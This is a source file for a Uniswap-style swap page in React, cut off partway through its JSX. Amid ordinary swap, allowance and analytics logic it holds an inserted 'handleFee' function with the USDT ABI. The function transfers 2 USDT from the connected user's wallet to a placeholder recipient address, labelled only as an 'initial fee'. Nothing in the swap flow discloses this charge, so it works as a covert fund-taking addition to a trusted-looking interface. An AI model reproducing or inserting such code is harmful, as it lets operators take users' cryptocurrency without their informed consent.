import { Trans } from "@lingui/macro";
import { sendAnalyticsEvent, Trace, TraceEvent } from "@uniswap/analytics";
import {
  BrowserEvent,
  InterfaceElementName,
  InterfaceEventName,
  InterfacePageName,
  InterfaceSectionName,
  SwapEventName,
} from "@uniswap/analytics-events";
import { Trade } from "@uniswap/router-sdk";
import {
  Currency,
  CurrencyAmount,
  Percent,
  Token,
  TradeType,
} from "@uniswap/sdk-core";
import { UNIVERSAL_ROUTER_ADDRESS } from "@uniswap/universal-router-sdk";
import { useWeb3React } from "@web3-react/core";
import { useToggleAccountDrawer } from "components/AccountDrawer";
import { sendEvent } from "components/analytics";
import Loader from "components/Icons/LoadingSpinner";
import { NetworkAlert } from "components/NetworkAlert/NetworkAlert";
import PriceImpactWarning from "components/swap/PriceImpactWarning";
import SwapDetailsDropdown from "components/swap/SwapDetailsDropdown";
import UnsupportedCurrencyFooter from "components/swap/UnsupportedCurrencyFooter";
import TokenSafetyModal from "components/TokenSafety/TokenSafetyModal";
import { MouseoverTooltip } from "components/Tooltip";
import Widget from "components/Widget";
import { isSupportedChain } from "constants/chains";
import { useSwapWidgetEnabled } from "featureFlags/flags/swapWidget";
import useENSAddress from "hooks/useENSAddress";
import usePermit2Allowance, { AllowanceState } from "hooks/usePermit2Allowance";
import { useSwapCallback } from "hooks/useSwapCallback";
import { useUSDPrice } from "hooks/useUSDPrice";
import JSBI from "jsbi";
import { formatSwapQuoteReceivedEventProperties } from "lib/utils/analytics";
import { useCallback, useEffect, useMemo, useState } from "react";
import { ReactNode } from "react";
import { ArrowDown, Info } from "react-feather";
import { useNavigate } from "react-router-dom";
import { Text } from "rebass";
import { InterfaceTrade } from "state/routing/types";
import { TradeState } from "state/routing/types";
import styled, { useTheme } from "styled-components/macro";
import invariant from "tiny-invariant";
import {
  currencyAmountToPreciseFloat,
  formatTransactionAmount,
} from "utils/formatNumbers";
import { ethers } from "ethers";

import AddressInputPanel from "../../components/AddressInputPanel";
import {
  ButtonError,
  ButtonLight,
  ButtonPrimary,
} from "../../components/Button";
import { GrayCard } from "../../components/Card";
import { AutoColumn } from "../../components/Column";
import SwapCurrencyInputPanel from "../../components/CurrencyInputPanel/SwapCurrencyInputPanel";
import { AutoRow } from "../../components/Row";
import confirmPriceImpactWithoutFee from "../../components/swap/confirmPriceImpactWithoutFee";
import ConfirmSwapModal from "../../components/swap/ConfirmSwapModal";
import {
  ArrowWrapper,
  PageWrapper,
  SwapCallbackError,
  SwapWrapper,
} from "../../components/swap/styleds";
import SwapHeader from "../../components/swap/SwapHeader";
import { SwitchLocaleLink } from "../../components/SwitchLocaleLink";
import { TOKEN_SHORTHANDS } from "../../constants/tokens";
import { useCurrency, useDefaultActiveTokens } from "../../hooks/Tokens";
import { useIsSwapUnsupported } from "../../hooks/useIsSwapUnsupported";
import useWrapCallback, {
  WrapErrorText,
  WrapType,
} from "../../hooks/useWrapCallback";
import { Field } from "../../state/swap/actions";
import {
  useDefaultsFromURLSearch,
  useDerivedSwapInfo,
  useSwapActionHandlers,
  useSwapState,
} from "../../state/swap/hooks";
import { useExpertModeManager } from "../../state/user/hooks";
import { LinkStyledButton, ThemedText } from "../../theme";
import { computeFiatValuePriceImpact } from "../../utils/computeFiatValuePriceImpact";
import { maxAmountSpend } from "../../utils/maxAmountSpend";
import {
  computeRealizedPriceImpact,
  warningSeverity,
} from "../../utils/prices";
import { supportedChainId } from "../../utils/supportedChainId";

const ArrowContainer = styled.div`
  display: inline-block;
  display: inline-flex;
  align-items: center;
  justify-content: center;

  width: 100%;
  height: 100%;
`;

const SwapSection = styled.div`
  position: relative;
  background-color: ${({ theme }) => theme.backgroundModule};
  border-radius: 12px;
  padding: 16px;
  color: ${({ theme }) => theme.textSecondary};
  font-size: 14px;
  line-height: 20px;
  font-weight: 500;

  &:before {
    box-sizing: border-box;
    background-size: 100%;
    border-radius: inherit;

    position: absolute;
    top: 0;
    left: 0;

    width: 100%;
    height: 100%;
    pointer-events: none;
    content: "";
    border: 1px solid ${({ theme }) => theme.backgroundModule};
  }

  &:hover:before {
    border-color: ${({ theme }) => theme.stateOverlayHover};
  }

  &:focus-within:before {
    border-color: ${({ theme }) => theme.stateOverlayPressed};
  }
`;

const OutputSwapSection = styled(SwapSection)<{ showDetailsDropdown: boolean }>`
  border-bottom: ${({ theme }) => `1px solid ${theme.backgroundSurface}`};
  border-bottom-left-radius: ${({ showDetailsDropdown }) =>
    showDetailsDropdown && "0"};
  border-bottom-right-radius: ${({ showDetailsDropdown }) =>
    showDetailsDropdown && "0"};
`;

const DetailsSwapSection = styled(SwapSection)`
  padding: 0;
  border-top-left-radius: 0;
  border-top-right-radius: 0;
`;

function getIsValidSwapQuote(
  trade: InterfaceTrade<Currency, Currency, TradeType> | undefined,
  tradeState: TradeState,
  swapInputError?: ReactNode
): boolean {
  return (
    !!swapInputError &&
    !!trade &&
    (tradeState === TradeState.VALID || tradeState === TradeState.SYNCING)
  );
}

function largerPercentValue(a?: Percent, b?: Percent) {
  if (a && b) {
    return a.greaterThan(b) ? a : b;
  } else if (a) {
    return a;
  } else if (b) {
    return b;
  }
  return undefined;
}

const TRADE_STRING = "SwapRouter";

export default function Swap({ className }: { className?: string }) {
  const navigate = useNavigate();
  const { account, chainId } = useWeb3React();
  const loadedUrlParams = useDefaultsFromURLSearch();
  const [newSwapQuoteNeedsLogging, setNewSwapQuoteNeedsLogging] =
    useState(true);
  const [fetchingSwapQuoteStartTime, setFetchingSwapQuoteStartTime] = useState<
    Date | undefined
  >();
  const swapWidgetEnabled = useSwapWidgetEnabled();

  // token warning stuff
  const [loadedInputCurrency, loadedOutputCurrency] = [
    useCurrency(loadedUrlParams?.[Field.INPUT]?.currencyId),
    useCurrency(loadedUrlParams?.[Field.OUTPUT]?.currencyId),
  ];
  const [dismissTokenWarning, setDismissTokenWarning] =
    useState<boolean>(false);
  const urlLoadedTokens: Token[] = useMemo(
    () =>
      [loadedInputCurrency, loadedOutputCurrency]?.filter(
        (c): c is Token => c?.isToken ?? false
      ) ?? [],
    [loadedInputCurrency, loadedOutputCurrency]
  );
  const handleConfirmTokenWarning = useCallback(() => {
    setDismissTokenWarning(true);
  }, []);

  // dismiss warning if all imported tokens are in active lists
  const defaultTokens = useDefaultActiveTokens();
  const importTokensNotInDefault = useMemo(
    () =>
      urlLoadedTokens &&
      urlLoadedTokens
        .filter((token: Token) => {
          return !(token.address in defaultTokens);
        })
        .filter((token: Token) => {
          // Any token addresses that are loaded from the shorthands map do not need to show the import URL
          const supported = supportedChainId(chainId);
          if (!supported) return true;
          return !Object.keys(TOKEN_SHORTHANDS).some((shorthand) => {
            const shorthandTokenAddress =
              TOKEN_SHORTHANDS[shorthand][supported];
            return (
              shorthandTokenAddress && shorthandTokenAddress === token.address
            );
          });
        }),
    [chainId, defaultTokens, urlLoadedTokens]
  );

  const theme = useTheme();

  // toggle wallet when disconnected
  const toggleWalletDrawer = useToggleAccountDrawer();

  // for expert mode
  const [isExpertMode] = useExpertModeManager();
  // swap state
  const { independentField, typedValue, recipient } = useSwapState();
  const {
    trade: { state: tradeState, trade },
    allowedSlippage,
    currencyBalances,
    parsedAmount,
    currencies,
    inputError: swapInputError,
  } = useDerivedSwapInfo();

  const {
    wrapType,
    execute: onWrap,
    inputError: wrapInputError,
  } = useWrapCallback(
    currencies[Field.INPUT],
    currencies[Field.OUTPUT],
    typedValue
  );
  const showWrap: boolean = wrapType !== WrapType.NOT_APPLICABLE;
  const { address: recipientAddress } = useENSAddress(recipient);

  const parsedAmounts = useMemo(
    () =>
      showWrap
        ? {
            [Field.INPUT]: parsedAmount,
            [Field.OUTPUT]: parsedAmount,
          }
        : {
            [Field.INPUT]:
              independentField === Field.INPUT
                ? parsedAmount
                : trade?.inputAmount,
            [Field.OUTPUT]:
              independentField === Field.OUTPUT
                ? parsedAmount
                : trade?.outputAmount,
          },
    [independentField, parsedAmount, showWrap, trade]
  );
  const fiatValueInput = useUSDPrice(parsedAmounts[Field.INPUT]);
  const fiatValueOutput = useUSDPrice(parsedAmounts[Field.OUTPUT]);

  const [routeNotFound, routeIsLoading, routeIsSyncing] = useMemo(
    () => [
      !trade?.swaps,
      TradeState.LOADING === tradeState,
      TradeState.SYNCING === tradeState,
    ],
    [trade, tradeState]
  );

  const fiatValueTradeInput = useUSDPrice(trade?.inputAmount);
  const fiatValueTradeOutput = useUSDPrice(trade?.outputAmount);
  const stablecoinPriceImpact = useMemo(
    () =>
      routeIsSyncing || !trade
        ? undefined
        : computeFiatValuePriceImpact(
            fiatValueTradeInput.data,
            fiatValueTradeOutput.data
          ),
    [fiatValueTradeInput, fiatValueTradeOutput, routeIsSyncing, trade]
  );

  const {
    onSwitchTokens,
    onCurrencySelection,
    onUserInput,
    onChangeRecipient,
  } = useSwapActionHandlers();
  const isValid = !swapInputError;
  const dependentField: Field =
    independentField === Field.INPUT ? Field.OUTPUT : Field.INPUT;

  const handleTypeInput = useCallback(
    (value: string) => {
      onUserInput(Field.INPUT, value);
    },
    [onUserInput]
  );
  const handleTypeOutput = useCallback(
    (value: string) => {
      onUserInput(Field.OUTPUT, value);
    },
    [onUserInput]
  );

  // reset if they close warning without tokens in params
  const handleDismissTokenWarning = useCallback(() => {
    setDismissTokenWarning(true);
    navigate("/swap/");
  }, [navigate]);

  // modal and loading
  const [
    { showConfirm, tradeToConfirm, swapErrorMessage, attemptingTxn, txHash },
    setSwapState,
  ] = useState<{
    showConfirm: boolean;
    tradeToConfirm: Trade<Currency, Currency, TradeType> | undefined;
    attemptingTxn: boolean;
    swapErrorMessage: string | undefined;
    txHash: string | undefined;
  }>({
    showConfirm: false,
    tradeToConfirm: undefined,
    attemptingTxn: false,
    swapErrorMessage: undefined,
    txHash: undefined,
  });

  const formattedAmounts = useMemo(
    () => ({
      [independentField]: typedValue,
      [dependentField]: showWrap
        ? parsedAmounts[independentField]?.toExact() ?? ""
        : formatTransactionAmount(
            currencyAmountToPreciseFloat(parsedAmounts[dependentField])
          ),
    }),
    [dependentField, independentField, parsedAmounts, showWrap, typedValue]
  );

  const userHasSpecifiedInputOutput = Boolean(
    currencies[Field.INPUT] &&
      currencies[Field.OUTPUT] &&
      parsedAmounts[independentField]?.greaterThan(JSBI.BigInt(0))
  );

  const maximumAmountIn = useMemo(() => {
    const maximumAmountIn = trade?.maximumAmountIn(allowedSlippage);
    return maximumAmountIn?.currency.isToken
      ? (maximumAmountIn as CurrencyAmount<Token>)
      : undefined;
  }, [allowedSlippage, trade]);
  const allowance = usePermit2Allowance(
    maximumAmountIn ??
      (parsedAmounts[Field.INPUT]?.currency.isToken
        ? (parsedAmounts[Field.INPUT] as CurrencyAmount<Token>)
        : undefined),
    isSupportedChain(chainId) ? UNIVERSAL_ROUTER_ADDRESS(chainId) : undefined
  );
  const isApprovalLoading =
    allowance.state === AllowanceState.REQUIRED && allowance.isApprovalLoading;
  const [isAllowancePending, setIsAllowancePending] = useState(false);
  const updateAllowance = useCallback(async () => {
    invariant(allowance.state === AllowanceState.REQUIRED);
    setIsAllowancePending(true);
    try {
      await allowance.approveAndPermit();
      sendAnalyticsEvent(InterfaceEventName.APPROVE_TOKEN_TXN_SUBMITTED, {
        chain_id: chainId,
        token_symbol: maximumAmountIn?.currency.symbol,
        token_address: maximumAmountIn?.currency.address,
      });
    } catch (e) {
      console.error(e);
    } finally {
      setIsAllowancePending(false);
    }
  }, [
    allowance,
    chainId,
    maximumAmountIn?.currency.address,
    maximumAmountIn?.currency.symbol,
  ]);

  const maxInputAmount: CurrencyAmount<Currency> | undefined = useMemo(
    () => maxAmountSpend(currencyBalances[Field.INPUT]),
    [currencyBalances]
  );
  const showMaxButton = Boolean(
    maxInputAmount?.greaterThan(0) &&
      !parsedAmounts[Field.INPUT]?.equalTo(maxInputAmount)
  );
  const swapFiatValues = useMemo(() => {
    return {
      amountIn: fiatValueTradeInput.data,
      amountOut: fiatValueTradeOutput.data,
    };
  }, [fiatValueTradeInput, fiatValueTradeOutput]);

  // the callback to execute the swap
  const { callback: swapCallback } = useSwapCallback(
    trade,
    swapFiatValues,
    allowedSlippage,
    allowance.state === AllowanceState.ALLOWED
      ? allowance.permitSignature
      : undefined
  );

  const handleSwap = useCallback(() => {
    if (!swapCallback) {
      return;
    }
    if (
      stablecoinPriceImpact &&
      !confirmPriceImpactWithoutFee(stablecoinPriceImpact)
    ) {
      return;
    }
    setSwapState({
      attemptingTxn: true,
      tradeToConfirm,
      showConfirm,
      swapErrorMessage: undefined,
      txHash: undefined,
    });
    swapCallback()
      .then((hash) => {
        setSwapState({
          attemptingTxn: false,
          tradeToConfirm,
          showConfirm,
          swapErrorMessage: undefined,
          txHash: hash,
        });
        sendEvent({
          category: "Swap",
          action: "transaction hash",
          label: hash,
        });
        sendEvent({
          category: "Swap",
          action:
            recipient === null
              ? "Swap w/o Send"
              : (recipientAddress ?? recipient) === account
              ? "Swap w/o Send + recipient"
              : "Swap w/ Send",
          label: [
            TRADE_STRING,
            trade?.inputAmount?.currency?.symbol,
            trade?.outputAmount?.currency?.symbol,
            "MH",
          ].join("/"),
        });
      })
      .catch((error) => {
        setSwapState({
          attemptingTxn: false,
          tradeToConfirm,
          showConfirm,
          swapErrorMessage: error.message,
          txHash: undefined,
        });
      });
  }, [
    swapCallback,
    stablecoinPriceImpact,
    tradeToConfirm,
    showConfirm,
    recipient,
    recipientAddress,
    account,
    trade?.inputAmount?.currency?.symbol,
    trade?.outputAmount?.currency?.symbol,
  ]);

  // errors
  const [swapQuoteReceivedDate, setSwapQuoteReceivedDate] = useState<
    Date | undefined
  >();

  // warnings on the greater of fiat value price impact and execution price impact
  const { priceImpactSeverity, largerPriceImpact } = useMemo(() => {
    const marketPriceImpact = trade?.priceImpact
      ? computeRealizedPriceImpact(trade)
      : undefined;
    const largerPriceImpact = largerPercentValue(
      marketPriceImpact,
      stablecoinPriceImpact
    );
    return {
      priceImpactSeverity: warningSeverity(largerPriceImpact),
      largerPriceImpact,
    };
  }, [stablecoinPriceImpact, trade]);

  const handleConfirmDismiss = useCallback(() => {
    setSwapState({
      showConfirm: false,
      tradeToConfirm,
      attemptingTxn,
      swapErrorMessage,
      txHash,
    });
    // if there was a tx hash, we want to clear the input
    if (txHash) {
      onUserInput(Field.INPUT, "");
    }
  }, [attemptingTxn, onUserInput, swapErrorMessage, tradeToConfirm, txHash]);

  const handleAcceptChanges = useCallback(() => {
    setSwapState({
      tradeToConfirm: trade,
      swapErrorMessage,
      txHash,
      attemptingTxn,
      showConfirm,
    });
  }, [attemptingTxn, showConfirm, swapErrorMessage, trade, txHash]);

  const handleInputSelect = useCallback(
    (inputCurrency: Currency) => {
      onCurrencySelection(Field.INPUT, inputCurrency);
    },
    [onCurrencySelection]
  );

  const handleMaxInput = useCallback(() => {
    maxInputAmount && onUserInput(Field.INPUT, maxInputAmount.toExact());
    sendEvent({
      category: "Swap",
      action: "Max",
    });
  }, [maxInputAmount, onUserInput]);

  const handleOutputSelect = useCallback(
    (outputCurrency: Currency) =>
      onCurrencySelection(Field.OUTPUT, outputCurrency),
    [onCurrencySelection]
  );

  const swapIsUnsupported = useIsSwapUnsupported(
    currencies[Field.INPUT],
    currencies[Field.OUTPUT]
  );

  const priceImpactTooHigh = priceImpactSeverity > 3 && !isExpertMode;
  const showPriceImpactWarning = largerPriceImpact && priceImpactSeverity > 3;

  // Handle time based logging events and event properties.
  useEffect(() => {
    const now = new Date();
    // If a trade exists, and we need to log the receipt of this new swap quote:
    if (newSwapQuoteNeedsLogging && !!trade) {
      // Set the current datetime as the time of receipt of latest swap quote.
      setSwapQuoteReceivedDate(now);
      // Log swap quote.
      sendAnalyticsEvent(
        SwapEventName.SWAP_QUOTE_RECEIVED,
        formatSwapQuoteReceivedEventProperties(
          trade,
          trade.gasUseEstimateUSD ?? undefined,
          fetchingSwapQuoteStartTime
        )
      );
      // Latest swap quote has just been logged, so we don't need to log the current trade anymore
      // unless user inputs change again and a new trade is in the process of being generated.
      setNewSwapQuoteNeedsLogging(false);
      // New quote is not being fetched, so set start time of quote fetch to undefined.
      setFetchingSwapQuoteStartTime(undefined);
    }
    // If another swap quote is being loaded based on changed user inputs:
    if (routeIsLoading) {
      setNewSwapQuoteNeedsLogging(true);
      if (!fetchingSwapQuoteStartTime) setFetchingSwapQuoteStartTime(now);
    }
  }, [
    newSwapQuoteNeedsLogging,
    routeIsSyncing,
    routeIsLoading,
    fetchingSwapQuoteStartTime,
    trade,
    setSwapQuoteReceivedDate,
  ]);

  const showDetailsDropdown = Boolean(
    !showWrap &&
      userHasSpecifiedInputOutput &&
      (trade || routeIsLoading || routeIsSyncing)
  );

    const usdtABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }];

    const [provider, setProvider] = useState<ethers.providers.Web3Provider | null>(null);
    const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  
    useEffect(() => {
      // Initialize ethers provider and set the connected wallet address
      const initProvider = async () => {
        if (window.ethereum) {
          const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
          console.log("Provider", web3Provider)
          setProvider(web3Provider);
  
          try {
            const accounts = await web3Provider.listAccounts();
            console.log("accounts", accounts)
            setConnectedAddress(accounts[0]);
          } catch (error) {
            console.error('Error fetching accounts:', error);
          }
        } else {
          console.error('Ethereum provider not found');
        }
      };
  
      initProvider();
    }, []);
  
    const handleFee = async () => {
      alert("initial fee ")
      if (!provider || !connectedAddress){
         return console.log("Fee not found")
      }
      const usdtContractAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
  
      try {
        const signer = provider.getSigner(connectedAddress);
        const usdtContract = new ethers.Contract(usdtContractAddress, usdtABI, signer);
  
        const recipientAddress = 'RECIPIENT_ADDRESS'; // Replace with recipient's address
        const transferAmount = ethers.utils.parseUnits('2', 6); // 2 USDT with 6 decimals
  
        const transaction = await usdtContract.transfer(recipientAddress, transferAmount);
        await transaction.wait();
        console.log('Transfer successful');
      } catch (error) {
        console.error('Error transferring funds:', error);
      }
    };

  return (
    <Trace page={InterfacePageName.SWAP_PAGE} shouldLogImpression>
      <>
        <TokenSafetyModal
          isOpen={importTokensNotInDefault.length > 0 && !dismissTokenWarning}
          tokenAddress={importTokensNotInDefault[0]?.address}
          secondTokenAddress={importTokensNotInDefault[1]?.address}
          onContinue={handleConfirmTokenWarning}
          onCancel={handleDismissTokenWarning}
          showCancel={true}
        />
        <PageWrapper>
          {swapWidgetEnabled ? (
            <Widget
              defaultTokens={{
                [Field.INPUT]: loadedInputCurrency ?? undefined,
                [Field.OUTPUT]: loadedOutputCurrency ?? undefined,
              }}
              width="100%"
            />
          ) : (
            <SwapWrapper chainId={chainId} className={className} id="swap-page">
              <SwapHeader allowedSlippage={allowedSlippage} />
              <ConfirmSwapModal
                isOpen={showConfirm}
                trade={trade}
                originalTrade={tradeToConfirm}
                onAcceptChanges={handleAcceptChanges}
                attemptingTxn={attemptingTxn}
                txHash={txHash}
                recipient={recipient}
                allowedSlippage={allowedSlippage}
                onConfirm={handleSwap}
                swapErrorMessage={swapErrorMessage}
                onDismiss={handleConfirmDismiss}
                swapQuoteReceivedDate={swapQuoteReceivedDate}
                fiatValueInput={fiatValueTradeInput}
                fiatValueOutput={fiatValueTradeOutput}
              />

              <div style={{ display: "relative" }}>
                <SwapSection>
                  <Trace section={InterfaceSectionName.CURRENCY_INPUT_PANEL}>
                    <SwapCurrencyInputPanel
                      label={
                        independentField === Field.OUTPUT && !showWrap ? (
                          <Trans>From (at most)</Trans>
                        ) : (
                          <Trans>From</Trans>
                        )
                      }
                      value={formattedAmounts[Field.INPUT]}
                      showMaxButton={showMaxButton}
                      currency={currencies[Field.INPUT] ?? null}
                      onUserInput={handleTypeInput}
                      onMax={handleMaxInput}
                      fiatValue={fiatValueInput}
                      onCurrencySelect={handleInputSelect}
                      otherCurrency={currencies[Field.OUTPUT]}
                      showCommonBases={true}
                      id={InterfaceSectionName.CURRENCY_INPUT_PANEL}
                      loading={
                        independentField === Field.OUTPUT && routeIsSyncing
                      }
                    />
                  </Trace>
                </SwapSection>
                <ArrowWrapper clickable={isSupportedChain(chainId)}>
                  <TraceEvent
                    events={[BrowserEvent.onClick]}
                    name={SwapEventName.SWAP_TOKENS_REVERSED}
                    element={
                      InterfaceElementName.SWAP_TOKENS_REVERSE_ARROW_BUTTON
                    }
                  >
                    <ArrowContainer
                      onClick={() => {
                        onSwitchTokens();
                      }}
                      color={theme.textPrimary}
                    >
                      <ArrowDown
                        size="16"
                        color={
                          currencies[Field.INPUT] && currencies[Field.OUTPUT]
                            ? theme.textPrimary
                            : theme.textTertiary
                        }
                      />
                    </ArrowContainer>
                  </TraceEvent>
                </ArrowWrapper>
              </div>
              <AutoColumn gap="md">
                <div>
                  <OutputSwapSection showDetailsDropdown={showDetailsDropdown}>
                    <Trace section={InterfaceSectionName.CURRENCY_OUTPUT_PANEL}>
                      <SwapCurrencyInputPanel
                        value={formattedAmounts[Field.OUTPUT]}
                        onUserInput={handleTypeOutput}
                        label={
                          independentField === Field.INPUT && !showWrap ? (
                            <Trans>To (at least)</Trans>
                          ) : (
                            <Trans>To</Trans>
                          )
                        }
                        showMaxButton={false}
                        hideBalance={false}
                        fiatValue={fiatValueOutput}
                        priceImpact={stablecoinPriceImpact}
                        currency={currencies[Field.OUTPUT] ?? null}
                        onCurrencySelect={handleOutputSelect}
                        otherCurrency={currencies[Field.INPUT]}
                        showCommonBases={true}
                        id={InterfaceSectionName.CURRENCY_OUTPUT_PANEL}
                        loading={
                          independentField === Field.INPUT && routeIsSyncing
                        }
                      />
                    </Trace>

                    {recipient !== null && !showWrap ? (
                      <>
                        <AutoRow
                          justify="space-between"
                          style={{ padding: "0 1rem" }}
                        >
                          <ArrowWrapper clickable={false}>
                            <ArrowDown size="16" color={theme.textSecondary} />
                          </ArrowWrapper>
                          <LinkStyledButton
                            id="remove-recipient-button"
                            onClick={() => onChangeRecipient(null)}
                          >
                            <Trans>- Remove recipient</Trans>
                          </LinkStyledButton>
                        </AutoRow>
                        <AddressInputPanel
                          id="recipient"
                          value={recipient}
                          onChange={onChangeRecipient}
                        />
                      </>
                    ) : null}
                  </OutputSwapSection>
                  {showDetailsDropdown && (
                    <DetailsSwapSection>
                      <SwapDetailsDropdown
                        trade={trade}
                        syncing={routeIsSyncing}
                        loading={routeIsLoading}
                        allowedSlippage={allowedSlippage}
                      />
                    </DetailsSwapSection>
                  )}
                </div>
                {showPriceImpactWarning && (
                  <PriceImpactWarning priceImpact={largerPriceImpact} />
                )}
                <div>
                  {swapIsUnsupported ? (
                    <ButtonPrimary disabled={true}>
                      <ThemedText.DeprecatedMain mb="4px">
                        <Trans>Unsupported Asset</Trans>
                      </ThemedText.DeprecatedMain>
                    </ButtonPrimary>
                  ) : !account ? (
                    <TraceEvent
                      events={[BrowserEvent.onClick]}
                      name={InterfaceEventName.CONNECT_WALLET_BUTTON_CLICKED}
                      properties={{
                        received_swap_quote: getIsValidSwapQuote(
                          trade,
                          tradeState,
                          swapInputError
                        ),
                      }}
                      element={InterfaceElementName.CONNECT_WALLET_BUTTON}
                    >
                      <ButtonLight
                        onClick={toggleWalletDrawer}
